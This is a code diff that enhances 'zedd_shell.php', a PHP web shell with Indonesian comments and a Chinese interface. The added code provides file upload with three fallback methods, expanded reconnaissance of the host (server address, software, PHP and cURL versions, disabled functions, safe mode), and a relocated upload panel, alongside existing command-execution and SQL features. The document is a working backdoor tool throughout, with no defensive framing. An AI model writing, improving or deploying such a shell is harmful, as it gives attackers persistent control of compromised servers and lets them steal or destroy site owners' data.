@@ -32,7 +32,8 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
             body {
                 margin: 0;
                 padding: 0;
-                background: url('https://j.top4top.io/p_33782wpbs1.jpg') no-repeat center center fixed;
+                background-color: #1a1a1a;
+                /* background: url('https://j.top4top.io/p_33782wpbs1.jpg') no-repeat center center fixed; */
                 background-size: cover;
                 font-family: monospace;
                 color: #ddd;
@@ -95,6 +96,7 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
 ?>
 
 <?php
+
 // ===========================================================================
 // File: zedd_shell.php
 // Deskripsi: Shell berbasis PHP dengan tampilan tema hitam, border tabel biru,
@@ -175,6 +177,7 @@ function tulisLah()
 	$sonDir = implode("/", $sonDir);
 	print $sonDir . '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( <a href="">Reset</a> | <a href="javascript:goto()">Go to</a> )';
 }
+
 
 // Fungsi untuk format ukuran file
 function sizeFormat($bytes)
@@ -258,7 +261,7 @@ if(isset($_POST['berkas']) && is_string($_POST['berkas']))
 $default_dir = str_replace("\\", "/", $default_dir);
 
 // ===========================================================================
-// Penanganan aksi-aksi (download, hapus, buat, rename, SQL, dll.)
+// Penanganan aksi-aksi (download, hapus, buat, rename, SQL, dsb.)
 // ===========================================================================
 
 if(isset($_GET['awal']) && $_GET['awal']=="pinf")
@@ -512,6 +515,77 @@ else if($awal == 'upl_file' && isset($_FILES['ufile']))
 }
 
 ?>
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// Konfigurasi PHP untuk upload file
+ini_set('upload_max_filesize', '64M');
+ini_set('post_max_size', '64M');
+ini_set('max_input_time', '300');
+ini_set('max_execution_time', '300');
+
+/**
+ * Fungsi untuk sanitasi nama file
+ * Hanya mengizinkan karakter alfanumerik, underscore, titik, dan strip.
+ * Jika nama file sama dengan file uploader, tambahkan prefix.
+ */
+function sanitizeFilename($filename) {
+    $filename = preg_replace('/[^a-zA-Z0-9_\.-]/', '_', basename($filename));
+    if ($filename === basename(__FILE__)) {
+        $filename = 'upload_' . $filename;
+    }
+    return $filename;
+}
+
+$msg = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Pastikan file sudah diupload tanpa error
+    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
+        $originalName = $_FILES['upload_file']['name'];
+        $filename = sanitizeFilename($originalName);
+        // Ambil direktori tujuan dari input 'berkas'
+        if (isset($_POST['berkas']) && is_string($_POST['berkas']) && !empty($_POST['berkas'])) {
+            $targetDir = uraikan(urldecode($_POST['berkas']));
+            if (!is_dir($targetDir)) {
+                $targetDir = __DIR__;
+            }
+        } else {
+            $targetDir = __DIR__;
+        }
+        // Pastikan tidak ada trailing slash
+        $destination = rtrim($targetDir, '/') . '/' . $filename;
+
+        // Coba metode utama: move_uploaded_file()
+        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $destination)) {
+            // Ubah permission file agar dapat diakses
+            chmod($destination, 0644);
+            $msg = "文件 <strong>$filename</strong> 通过 move_uploaded_file 上传成功.";
+        } else {
+            // Jika gagal, coba fallback dengan copy()
+            if (copy($_FILES['upload_file']['tmp_name'], $destination)) {
+                unlink($_FILES['upload_file']['tmp_name']);
+                chmod($destination, 0644);
+                $msg = "文件 <strong>$filename</strong> 使用 fallback 方法 copy() 上传成功.";
+            } else {
+                // Fallback terakhir dengan file_get_contents + file_put_contents
+                $contents = file_get_contents($_FILES['upload_file']['tmp_name']);
+                if ($contents !== false && file_put_contents($destination, $contents)) {
+                    unlink($_FILES['upload_file']['tmp_name']);
+                    chmod($destination, 0644);
+                    $msg = "文件 <strong>$filename</strong> 使用 fallback 方法 file_get_contents() 和 file_put_contents() 上传成功.";
+                } else {
+                    $msg = "上传文件失败. 请检查目录权限和服务器配置.";
+                }
+            }
+        }
+    } else {
+        $errorCode = isset($_FILES['upload_file']['error']) ? $_FILES['upload_file']['error'] : 'unknown';
+        $msg = "上传文件时发生错误. (错误代码: $errorCode)";
+    }
+}
+?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -704,29 +778,65 @@ a {
 <body>
 <div class="system-info">
     <div class="system-info-left">
-        <p><strong>系统信息:</strong> <?php echo php_uname(); ?></p>
-        <p><strong>用户:</strong> <?php echo getmyuid() . " (" . get_current_user() . ")"; ?></p>
-        <p><strong>组:</strong> <?php 
-            if (function_exists('posix_getegid')) {
-                $qid = posix_getgrgid(posix_getegid());
-                echo getmygid() . " (" . $qid['name'] . ")";
-            } else {
-                echo getmygid();
-            }
-        ?></p>
-        <p><strong>禁用函数:</strong> <?php echo (implode(", ", $nami)=="" ? "<span class='success'>NONE :)</span>" : "<span class='bad'>" . implode(", ", $nami) . "</span>"); ?></p>
         <p>
-            <strong>安全模式:</strong> <?php echo ($safeMode === true ? "<span class='bad'>On</span>" : "<span class='success'>Off</span>"); ?> 
-            <span style="margin-left: 50px;"><a href='javascript:halaman("?awal=phpinfo")'>[ PHP信息 ]</a></span>
+            <strong style="color: #00aaff;">系统信息:</strong>
+            <span style="color: #ffffff;"><?php echo htmlspecialchars(php_uname()); ?></span>
         </p>
         <p>
-
-
-
-
+            <strong style="color: #00aaff;">用户:</strong>
+            <span style="color: #ffffff;"><?php echo getmyuid() . " (" . get_current_user() . ")"; ?></span>
+        </p>
+        <p>
+            <strong style="color: #00aaff;">组:</strong>
+            <span style="color: #ffffff;"><?php 
+                if (function_exists('posix_getegid')) {
+                    $qid = posix_getgrgid(posix_getegid());
+                    echo getmygid() . " (" . $qid['name'] . ")";
+                } else {
+                    echo getmygid();
+                }
+            ?></span>
+        </p>
+        <p>
+            <strong style="color: #00aaff;">禁用函数:</strong>
+            <span style="color: #ff6666;"><?php echo (implode(", ", $nami)=="" ? "NONE :)" : implode(", ", $nami)); ?></span>
+        </p>
+        <p>
+            <strong style="color: #00aaff;">安全模式:</strong>
+            <span style="color: <?php echo ($safeMode === true ? "#ff6666" : "#66cc66"); ?>;"><?php echo ($safeMode === true ? "On" : "Off"); ?></span>
+            <span style="margin-left: 50px;"><a href='javascript:halaman("?awal=phpinfo")' style="color: #ffaa00;">[ PHP信息 ]</a></span>
+        </p>
+        <!-- 额外系统信息 -->
+        <p>
+            <strong style="color: #00aaff;">服务器地址:</strong>
+            <span style="color: #ffffff;"><?php
+                $serverAddr = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname(gethostname());
+                echo htmlspecialchars($serverAddr);
+            ?></span>
+        </p>
+        <p>
+            <strong style="color: #00aaff;">服务器软件:</strong>
+            <span style="color: #ffffff;"><?php echo isset($_SERVER['SERVER_SOFTWARE']) ? htmlspecialchars($_SERVER['SERVER_SOFTWARE']) : '未知'; ?></span>
+        </p>
+        <p>
+            <strong style="color: #00aaff;">PHP版本:</strong>
+            <span style="color: #ffffff;"><?php echo htmlspecialchars(phpversion()); ?></span>
+        </p>
+        <p>
+            <strong style="color: #00aaff;">cURL版本:</strong>
+            <span style="color: #ffffff;"><?php echo function_exists('curl_version') ? htmlspecialchars(curl_version()['version']) : '无'; ?></span>
+        </p>
+        <p>
+            <strong style="color: #00aaff;">当前目录:</strong>
+            <span style="color: #ffffff;"><?php echo htmlspecialchars(getcwd()); ?></span>
+        </p>
+        <p>
+            <strong style="color: #00aaff;">服务器时间:</strong>
+            <span style="color: #ffffff;"><?php echo date('Y-m-d H:i:s'); ?></span>
+        </p>
     </div>
     <div class="ascii-art">
-<pre>
+<pre style="color: #66cc66;">
   __  __                  _____          _       
  |  \/  |                / ____|        | |      
  | \  / | __ _ _ __  ___| |     ___   __| | ___  
@@ -734,35 +844,51 @@ a {
  | |  | | (_| | | | |/ /| |___| (_) | (_| |  __/ 
  |_|  |_|\__,_|_| |_/___|\_____\___/ \__,_|\___| 
 </pre>
+    </div>
 </div>
+
 
 </div>
 <hr>
 
 <hr>
+<!-- Tempelkan potongan kode berikut di lokasi bagian upload, menggantikan kode upload lama -->
+<div class="upload-container">
+    <!-- Metode Upload Tradisional -->
+    <div class="upload-method">
+        <h4>传统上传</h4>
+        <form method="POST" enctype="multipart/form-data" action="<?= $_SERVER['PHP_SELF']; ?>">
+             <input type="hidden" name="awal" value="upl_file">
+             <input type="hidden" name="berkas" value="<?= urlencode(kunci($default_dir)); ?>">
+             <input type="file" name="ufile">
+             <input type="submit" value="上传">
+        </form>
+    </div>
+    <!-- Metode Upload AJAX -->
+    <div class="upload-method">
+        <h4>AJAX上传</h4>
+        <form id="ajaxUploadForm" method="POST" enctype="multipart/form-data" action="<?= $_SERVER['PHP_SELF']; ?>">
+             <input type="hidden" name="awal" value="upl_file">
+             <input type="hidden" name="berkas" value="<?= urlencode(kunci($default_dir)); ?>">
+             <input type="file" name="ufile" id="ajaxUfile">
+             <button type="button" id="ajaxUploadBtn">上传</button>
+        </form>
+        <div id="uploadStatus"></div>
+    </div>
+    <!-- Metode Upload 3 -->
+    <div class="upload-method">
+        <h4>上传文件</h4>
+        <form id="uploadForm" method="POST" enctype="multipart/form-data" action="<?= $_SERVER['PHP_SELF']; ?>">
+            <input type="file" name="upload_file" id="uploadInput">
+            <input type="hidden" name="berkas" value="<?= urlencode(kunci($default_dir)); ?>">
+            <button type="submit">上传</button>
+        </form>
+        <!-- Menampilkan pesan hasil upload jika ada -->
+        <?php if (!empty($msg)) echo '<div id="uploadStatus">' . $msg . '</div>'; ?>
+    </div>
 
+</div>
 <?php
-// ===========================================================================
-// Tampilan informasi sistem (dalam bahasa Mandarin)
-// ===========================================================================
-// if(function_exists('posix_getegid'))
-// {
-// 	$qid = posix_getgrgid(posix_getegid());
-// 	$qrup = $qid['name'];
-// 	print "<span class='qalin'>系统信息:</span> " . php_uname() . "<br/>";
-// 	print "<span class='qalin'>用户:</span> " . getmyuid() . " (" . get_current_user() . ")<br/>";
-// 	print "<span class='qalin'>组:</span> " . getmygid() . " (" . $qrup . ")<br/>";
-// }
-// else
-// {
-// 	print "<span class='qalin'>系统信息:</span> " . php_uname() . "<br/>";
-// 	print "<span class='qalin'>用户:</span> " . getmyuid() . " (" . get_current_user() . ")<br/>";
-// 	print "<span class='qalin'>组:</span> " . getmygid() . "<br/>";
-// }
-// print "<span class='qalin'>禁用函数:</span> " . (implode(", ", $nami)=="" ? "<span class='success'>NONE :)"
-// 	: "<span class='bad'>" . implode(", ", $nami)) . "</span><br/>";
-// print "<span class='qalin'>安全模式:</span> " . ($safeMode === true ? "<span class='bad'>On"
-// 	: "<span class='success'>Off") . "</span><span style='margin-left: 50px;'><a href='javascript:halaman(\"?awal=phpinfo\")'>[ PHP信息 ]</a></span><br/>";
 tulisLah();
 print '<hr>';
 
@@ -998,9 +1124,11 @@ else
 			{
 				$url = "";
                 $element = substr($element,1);
-                $fileNamaLengkap = $default_dir . $pemisah . $element;
                 $pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($element, 0, 1) != "/" ? "/" : "";
-
+                $fileNamaLengkap = $default_dir . $pemisah . $element;
+                // Tambahkan pendefinisian variabel isReadableColor dan classN
+                $isReadableColor = is_readable($fileNamaLengkap);
+                $classN = '';
                 if(is_dir($fileNamaLengkap))
                 {
                     $adi = "[ $element ]";
@@ -1069,33 +1197,11 @@ else
 }
 ?>
 <hr>
+
 <a href="javascript:newFile();">新建文件</a> | <a href="javascript:newPapka();">新建文件夹</a><br>
 <a href="javascript:halaman('?awal=sistem_kom&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>')">命令</a><br>
 <a href="javascript:halaman('?awal=skl');">SQL</a><br>
-<!-- Tempelkan potongan kode berikut di lokasi bagian upload, menggantikan kode upload lama -->
-<div class="upload-container">
-    <!-- Metode Upload Tradisional -->
-    <div class="upload-method">
-        <h4>传统上传</h4>
-        <form method="POST" enctype="multipart/form-data" action="<?= $_SERVER['PHP_SELF']; ?>">
-             <input type="hidden" name="awal" value="upl_file">
-             <input type="hidden" name="berkas" value="<?= urlencode(kunci($default_dir)); ?>">
-             <input type="file" name="ufile">
-             <input type="submit" value="上传">
-        </form>
-    </div>
-    <!-- Metode Upload AJAX -->
-    <div class="upload-method">
-        <h4>AJAX上传</h4>
-        <form id="ajaxUploadForm" method="POST" enctype="multipart/form-data" action="<?= $_SERVER['PHP_SELF']; ?>">
-             <input type="hidden" name="awal" value="upl_file">
-             <input type="hidden" name="berkas" value="<?= urlencode(kunci($default_dir)); ?>">
-             <input type="file" name="ufile" id="ajaxUfile">
-             <button type="button" id="ajaxUploadBtn">上传</button>
-        </form>
-        <div id="uploadStatus"></div>
-    </div>
-</div>
+
 
 <form method="POST" id="post_form" style="display: none;"></form>
 <script>
@@ -1114,8 +1220,9 @@ function halaman(url)
 		if(typeof keyAndValue[1] == "undefined") continue;
 		inputlar += "<input name='" + keyAndValue[0] + "' value='" + keyAndValue[1] + "' type='hidden'>";
 	}
-	document.all("post_form").innerHTML = inputlar;
-	document.all("post_form").submit();
+	// Menggunakan document.getElementById untuk mendapatkan elemen form
+	document.getElementById("post_form").innerHTML = inputlar;
+	document.getElementById("post_form").submit();
 }
 function faylSil(url)
 {
